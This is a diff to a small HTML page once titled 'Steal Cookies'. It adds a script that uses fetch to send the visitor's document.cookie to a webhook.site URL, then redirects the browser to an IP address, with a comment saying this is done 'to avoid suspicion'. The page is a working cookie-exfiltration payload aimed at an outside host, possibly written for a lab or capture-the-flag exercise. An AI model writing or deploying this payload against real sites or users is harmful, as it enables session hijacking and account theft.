@@ -1,9 +1,13 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <title>Steal Cookies</title>
-</head>
 <body>
-  <img src="https://webhook.site/66913043-6f01-4379-a697-b3e3b7516829/?cookie=" + document.cookie>
+  <script>
+    // Send cookie to your webhook
+    fetch('https://webhook.site/66913043-6f01-4379-a697-b3e3b7516829?cookie=' + document.cookie)
+      .then(() => {
+        // Optional: Redirect to avoid suspicion
+        window.location = "http://167.71.200.118:7002/";
+      });
+  </script>
 </body>
 </html>
